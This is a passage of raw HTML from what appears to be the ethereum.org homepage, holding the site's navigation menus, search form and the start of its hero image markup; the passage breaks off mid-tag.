                            d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z">
                          </path>
                        </svg>
                      </form>
                      <div class="Search__HitsWrapper-sc-1qm8xwy-1 kbzFYA">
                        <div><strong><span>No results for your search</span></strong> <!-- -->&quot;
                          <!-- -->&quot;
                        </div>
                      </div>
                    </div><button aria-label="Switch to Dark Theme"
                      class="NakedButton-sc-1g43w8v-0 Nav__ThemeToggle-sc-1aprtmp-12 dUatah bKrjAL"><svg
                        stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                        class="Icon__StyledIcon-sc-1o8zi5s-0 Nav__NavIcon-sc-1aprtmp-13 ilAeZt bJKbgw" height="24"
                        width="24" xmlns="http://www.w3.org/2000/svg">
                        <path fill="none" d="M0 0h24v24H0z"></path>
                        <path
                          d="M6.76 4.84l-1.8-1.79-1.41 1.41 1.79 1.79 1.42-1.41zM4 10.5H1v2h3v-2zm9-9.95h-2V3.5h2V.55zm7.45 3.91l-1.41-1.41-1.79 1.79 1.41 1.41 1.79-1.79zm-3.21 13.7l1.79 1.8 1.41-1.41-1.8-1.79-1.4 1.4zM20 10.5v2h3v-2h-3zm-8-5c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm-1 16.95h2V19.5h-2v2.95zm-7.45-3.91l1.41 1.41 1.79-1.8-1.41-1.41-1.79 1.8z">
                        </path>
                      </svg></button><a
                      class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Nav__RightNavLink-sc-1aprtmp-8 iLMavC dDpgOC"
                      href="/en/languages/"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
                        viewBox="0 0 24 24" class="Icon__StyledIcon-sc-1o8zi5s-0 Nav__NavIcon-sc-1aprtmp-13 ilAeZt bJKbgw"
                        height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                        <path fill="none" d="M0 0h24v24H0z"></path>
                        <path
                          d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95a15.65 15.65 0 00-1.38-3.56A8.03 8.03 0 0118.92 8zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2 0 .68.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56A7.987 7.987 0 015.08 16zm2.95-8H5.08a7.987 7.987 0 014.33-3.56A15.65 15.65 0 008.03 8zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2 0-.68.07-1.35.16-2h4.68c.09.65.16 1.32.16 2 0 .68-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95a8.03 8.03 0 01-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2 0-.68-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z">
                        </path>
                      </svg><span class="Nav__Span-sc-1aprtmp-11 bDRFLa"><span>Languages</span></span></a>
                  </div>
                </div>
                <div class="Mobile__Container-sc-zxc8gm-0 hhdXUp"><button aria-label="Toggle search button"
                    class="NakedButton-sc-1g43w8v-0 Mobile__MenuButton-sc-zxc8gm-2 dUatah dLNRLx"><svg
                      stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                      class="Icon__StyledIcon-sc-1o8zi5s-0 Mobile__MenuIcon-sc-zxc8gm-1 Mobile__OtherIcon-sc-zxc8gm-3 ilAeZt klOHLc hvwyGc"
                      height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                      <path fill="none" d="M0 0h24v24H0z"></path>
                      <path
                        d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z">
                      </path>
                    </svg></button><button aria-label="Toggle menu button"
                    class="NakedButton-sc-1g43w8v-0 Mobile__MenuButton-sc-zxc8gm-2 dUatah dLNRLx"><svg viewBox="0 0 24 40"
                      class="Mobile__GlyphButton-sc-zxc8gm-6 jXa-dMl">
                      <path d="M 2 13 l 10 0 l 0 0 l 10 0 M 4 19 l 8 0 M 12 19 l 8 0 M 2 25 l 10 0 l 0 0 l 10 0"></path>
                    </svg></button>
                  <div class="Mobile__MobileModal-sc-zxc8gm-4 bCHBHX" style="display:none;opacity:0"></div>
                  <div aria-hidden="true" class="Mobile__MenuContainer-sc-zxc8gm-5 cPYsfN"
                    style="transform:translateX(-100%) translateZ(0)">
                    <ul class="Mobile__MenuItems-sc-zxc8gm-10 gYetwr">
                      <li aria-label="Select Use Ethereum" class="Mobile__NavListItem-sc-zxc8gm-11 gXxMFO">
                        <div class="Mobile__SectionTitle-sc-zxc8gm-13 cGahMm"><span>Use Ethereum</span></div>
                        <ul class="Mobile__SectionItems-sc-zxc8gm-14 hghxUt">
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/wallets/"><span>Ethereum wallets</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/get-eth/"><span>Get ETH</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/dapps/"><span>Decentralized applications (dapps)</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/run-a-node/"><span>Run a node</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/stablecoins/"><span>Stablecoins</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/staking/"><span>Stake ETH</span></a></li>
                        </ul>
                      </li>
                      <li aria-label="Select Learn" class="Mobile__NavListItem-sc-zxc8gm-11 gXxMFO">
                        <div class="Mobile__SectionTitle-sc-zxc8gm-13 cGahMm"><span>Learn</span></div>
                        <ul class="Mobile__SectionItems-sc-zxc8gm-14 hghxUt">
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/"><span>What is Ethereum?</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/eth/"><span>What is ether (ETH)?</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/defi/"><span>Decentralized finance (DeFi)</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/dao/"><span>Decentralized autonomous organisations (DAOs)</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/nft/"><span>Non-fungible tokens (NFTs)</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/smart-contracts/"><span>Smart contracts</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/security/"><span>Ethereum security and scam prevention</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/history/"><span>History of Ethereum</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/whitepaper/"><span>Ethereum Whitepaper</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/upgrades/"><span>Ethereum upgrades</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos is-glossary SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/glossary/"><span>Ethereum glossary</span><svg stroke="currentColor"
                                fill="currentColor" stroke-width="0" viewBox="0 0 16 16"
                                class="Icon__StyledIcon-sc-1o8zi5s-0 Link__GlossaryIcon-sc-e3riao-3 ilAeZt fCuHsG"
                                height="12px" width="12px" xmlns="http://www.w3.org/2000/svg">
                                <path
                                  d="M2 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H2zm3.496 6.033a.237.237 0 0 1-.24-.247C5.35 4.091 6.737 3.5 8.005 3.5c1.396 0 2.672.73 2.672 2.24 0 1.08-.635 1.594-1.244 2.057-.737.559-1.01.768-1.01 1.486v.105a.25.25 0 0 1-.25.25h-.81a.25.25 0 0 1-.25-.246l-.004-.217c-.038-.927.495-1.498 1.168-1.987.59-.444.965-.736.965-1.371 0-.825-.628-1.168-1.314-1.168-.803 0-1.253.478-1.342 1.134-.018.137-.128.25-.266.25h-.825zm2.325 6.443c-.584 0-1.009-.394-1.009-.927 0-.552.425-.94 1.01-.94.609 0 1.028.388 1.028.94 0 .533-.42.927-1.029.927z">
                                </path>
                              </svg></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/governance/"><span>Ethereum governance</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/bridges/"><span>Blockchain bridges</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/energy-consumption/"><span>Ethereum energy consumption</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/eips/"><span>Ethereum Improvement Proposals</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/learn/"><span>Community guides and resources</span></a></li>
                        </ul>
                      </li>
                      <li aria-label="Select Developers" class="Mobile__NavListItem-sc-zxc8gm-11 gXxMFO">
                        <div class="Mobile__SectionTitle-sc-zxc8gm-13 cGahMm"><span>Developers</span></div>
                        <ul class="Mobile__SectionItems-sc-zxc8gm-14 hghxUt">
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/developers/"><span>Developers' home</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/developers/docs/"><span>Documentation</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/developers/tutorials/"><span>Tutorials</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/developers/learning-tools/"><span>Learn by coding</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/developers/local-environment/"><span>Set up local environment</span></a></li>
                        </ul>
                      </li>
                      <li aria-label="Select Enterprise" class="Mobile__NavListItem-sc-zxc8gm-11 gXxMFO">
                        <div class="Mobile__SectionTitle-sc-zxc8gm-13 cGahMm"><span>Enterprise</span></div>
                        <ul class="Mobile__SectionItems-sc-zxc8gm-14 hghxUt">
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/enterprise/"><span>Mainnet Ethereum</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/enterprise/private-ethereum/"><span>Private Ethereum</span></a></li>
                        </ul>
                      </li>
                      <li aria-label="Select Community" class="Mobile__NavListItem-sc-zxc8gm-11 gXxMFO">
                        <div class="Mobile__SectionTitle-sc-zxc8gm-13 cGahMm"><span>Community</span></div>
                        <ul class="Mobile__SectionItems-sc-zxc8gm-14 hghxUt">
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/community/"><span>Community hub</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/community/online/"><span>Online communities</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/community/events/"><span>Ethereum events</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/community/get-involved/"><span>Get involved</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/community/grants/"><span>Grants</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/community/support/"><span>Ethereum support</span></a></li>
                          <li class="Mobile__SectionItem-sc-zxc8gm-15 kdRQoZ"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos SharedStyledComponents__NavLink-sc-1cr9zfr-11 Mobile__StyledNavLink-sc-zxc8gm-12 iLMavC kuWShR"
                              href="/en/community/language-resources/"><span>Language resources</span></a></li>
                        </ul>
                      </li>
                    </ul>
                  </div>
                  <div aria-hidden="true" class="Mobile__BottomMenu-sc-zxc8gm-16 lkFvYp"
                    style="transform:translateX(-100%) translateZ(0)">
                    <div class="Mobile__BottomItem-sc-zxc8gm-17 eJpqSs"><svg stroke="currentColor" fill="currentColor"
                        stroke-width="0" viewBox="0 0 24 24"
                        class="Icon__StyledIcon-sc-1o8zi5s-0 Mobile__MenuIcon-sc-zxc8gm-1 ilAeZt klOHLc" height="24"
                        width="24" xmlns="http://www.w3.org/2000/svg">
                        <path fill="none" d="M0 0h24v24H0z"></path>
                        <path
                          d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z">
                        </path>
                      </svg>
                      <div class="Mobile__BottomItemText-sc-zxc8gm-19 hkZTkJ"><span>Search</span></div>
                    </div>
                    <div class="Mobile__BottomItem-sc-zxc8gm-17 eJpqSs"><svg stroke="currentColor" fill="currentColor"
                        stroke-width="0" viewBox="0 0 24 24"
                        class="Icon__StyledIcon-sc-1o8zi5s-0 Mobile__MenuIcon-sc-zxc8gm-1 ilAeZt klOHLc" height="24"
                        width="24" xmlns="http://www.w3.org/2000/svg">
                        <path fill="none" d="M0 0h24v24H0z"></path>
                        <path
                          d="M6.76 4.84l-1.8-1.79-1.41 1.41 1.79 1.79 1.42-1.41zM4 10.5H1v2h3v-2zm9-9.95h-2V3.5h2V.55zm7.45 3.91l-1.41-1.41-1.79 1.79 1.41 1.41 1.79-1.79zm-3.21 13.7l1.79 1.8 1.41-1.41-1.8-1.79-1.4 1.4zM20 10.5v2h3v-2h-3zm-8-5c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm-1 16.95h2V19.5h-2v2.95zm-7.45-3.91l1.41 1.41 1.79-1.8-1.41-1.41-1.79 1.8z">
                        </path>
                      </svg>
                      <div class="Mobile__BottomItemText-sc-zxc8gm-19 hkZTkJ"><span>Light</span></div>
                    </div>
                    <div class="Mobile__BottomItem-sc-zxc8gm-17 eJpqSs"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Mobile__BottomLink-sc-zxc8gm-18 eqKGZC"
                        href="/en/languages/"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
                          viewBox="0 0 24 24"
                          class="Icon__StyledIcon-sc-1o8zi5s-0 Mobile__MenuIcon-sc-zxc8gm-1 ilAeZt klOHLc" height="24"
                          width="24" xmlns="http://www.w3.org/2000/svg">
                          <path fill="none" d="M0 0h24v24H0z"></path>
                          <path
                            d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95a15.65 15.65 0 00-1.38-3.56A8.03 8.03 0 0118.92 8zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2 0 .68.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56A7.987 7.987 0 015.08 16zm2.95-8H5.08a7.987 7.987 0 014.33-3.56A15.65 15.65 0 008.03 8zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2 0-.68.07-1.35.16-2h4.68c.09.65.16 1.32.16 2 0 .68-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95a8.03 8.03 0 01-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2 0-.68-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z">
                          </path>
                        </svg>
                        <div class="Mobile__BottomItemText-sc-zxc8gm-19 hkZTkJ"><span>Languages</span></div>
                      </a></div>
                  </div>
                  <div class="Mobile__MenuContainer-sc-zxc8gm-5 Mobile__SearchContainer-sc-zxc8gm-7 cPYsfN gBSEi"
                    style="transform:translateX(-100%) translateZ(0)">
                    <h3 class="Mobile__SearchHeader-sc-zxc8gm-8 cYxofY"><span>Search</span><span
                        class="Mobile__CloseIconContainer-sc-zxc8gm-9 exWjZq"><svg stroke="currentColor"
                          fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                          class="Icon__StyledIcon-sc-1o8zi5s-0 ilAeZt" height="24" width="24"
                          xmlns="http://www.w3.org/2000/svg">
                          <path fill="none" d="M0 0h24v24H0z"></path>
                          <path
                            d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z">
                          </path>
                        </svg></span></h3>
                    <div class="Search__Root-sc-1qm8xwy-0 kNenpg">
                      <form class="Input__Form-sc-1utkal6-0 eoyKpR"><input type="text" id="header-search"
                          placeholder="Search" value="" aria-label="Search"
                          class="Input__StyledInput-sc-1utkal6-1 hBFIJH" />
                        <p class="Input__SearchSlash-sc-1utkal6-3 doxxqj">/</p><svg stroke="currentColor"
                          fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                          class="Icon__StyledIcon-sc-1o8zi5s-0 Input__SearchIcon-sc-1utkal6-2 ilAeZt gFzMVg" height="24"
                          width="24" xmlns="http://www.w3.org/2000/svg">
                          <path fill="none" d="M0 0h24v24H0z"></path>
                          <path
                            d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z">
                          </path>
                        </svg>
                      </form>
                      <div class="Search__HitsWrapper-sc-1qm8xwy-1 kbzFYA">
                        <div><strong><span>No results for your search</span></strong> <!-- -->&quot;
                          <!-- -->&quot;
                        </div>
                      </div>
                    </div>
                    <div class="Mobile__BlankSearchState-sc-zxc8gm-20 hNPbgI"><span size="3" mt="0" mr="0" mb="0" ml="0"
                        class="Emoji__StyledEmoji-sc-ihpuqw-0 hLjau undefined"><img alt="⛵"
                          src="https://twemoji.maxcdn.com/2/svg/26f5.svg"
                          style="width:1em;height:1em;margin:0 .05em 0 .1em;vertical-align:-0.1em" /></span><span>Search
                        away!</span></div>
                  </div>
                </div>
              </div>
            </nav>
          </div>
          <div id="main-content"></div>
          <div class="Layout__MainContainer-sc-19910io-1 gqazVg">
            <div class="Layout__MainContent-sc-19910io-2 kCJhKM">
              <main class="Layout__Main-sc-19910io-3 dliKfQ">
                <div dir="ltr" class="pages__Page-sc-179z7qu-3 fiKxAO">
                  <div data-gatsby-image-wrapper="" class="gatsby-image-wrapper pages__Hero-sc-179z7qu-0 cZXymR">
                    <div aria-hidden="true" style="padding-top:42.083333333333336%"></div><img aria-hidden="true"
                      data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async"
                      src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAACE4AAAhOAFFljFgAAACJUlEQVQozw2Q30/acBTF+8fucW9m2cOSZVlmsizzwTEzzbYMdUbFregEYpwsRREcplSUoRQKRX6U0lILfttS0Hv2fTjJfTjn3s89Qr4R4rrh4/eND6nkIhrV8eTpFZKHJjp9H5dVBln1oXCP2vNRuHAw/7GBuRcVxMQ2LlsM+/88ZJpTSNoUAmYhTB7smAGOtQl2T2yIYgejUYieEUDjRvuOazyFO3lEpT7G6zcqnr+sYmGlgQPlHvZogocgAKYhhLjMULxhOFcZdNNHqeLCNDyw4AG1pgd6JFRrIU75USKCyon2UiakYxt/zwbQewz5uodkiZMqDMJeKUCx6kG68pAuj5FTbGiai9uBD8sNEQQzrCc8HB158Dlh3/LR5TKtMZSyg3TRxm6RIX4RYjPHF/4Uu9ja6UK5dqHWbdSbY3TaDDflIXTVxJBNIBU8XOQ59Zih1XJRq7nI5hyIiT5Sp0MkMwZWxRaWxR6EuWdl+vy1Sa8+6LS4adBa2qZ0ZkDpRIsUSaeCfE8n5w5luORSm3LygM4vLSpLKv3YqNDyd4MWYgbFMxalpD4JW6kh4vtDLEbaeL/Uw3b6DlsHDgr8lSrvt3TKO24yZG8DxLNtZDNd3GoOWoUGttfqmOe5d9E+Ng9GEP/cQ/iVZfRlx6HIqkGrMZu0szr5lkW6OiU5yahSDejamVHZmpF0xUhue3RYHFE0MaTIxoDeLnVo5VufPvE5eezRf0Q7LGm2T/uSAAAAAElFTkSuQmCC"
                      alt="" />
                    <picture>
                      <img type="image/webp"
                        srcSet="/static/28214bb68eb5445dcb063a72535bc90c/b657a/hero.webp 750w,/static/28214bb68eb5445dcb063a72535bc90c/53522/hero.webp 1080w,/static/28214bb68eb5445dcb063a72535bc90c/5a3c8/hero.webp 1366w,/static/28214bb68eb5445dcb063a72535bc90c/9019e/hero.webp 1920w"
                        sizes="100vw" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1" sizes="100vw"
                        decoding="async" loading="eager"
                        src="https://d33wubrfki0l68.cloudfront.net/3882494c568f561159774f89d0c3fcece4493721/b7fd4/static/28214bb68eb5445dcb063a72535bc90c/f51a3/hero.png"
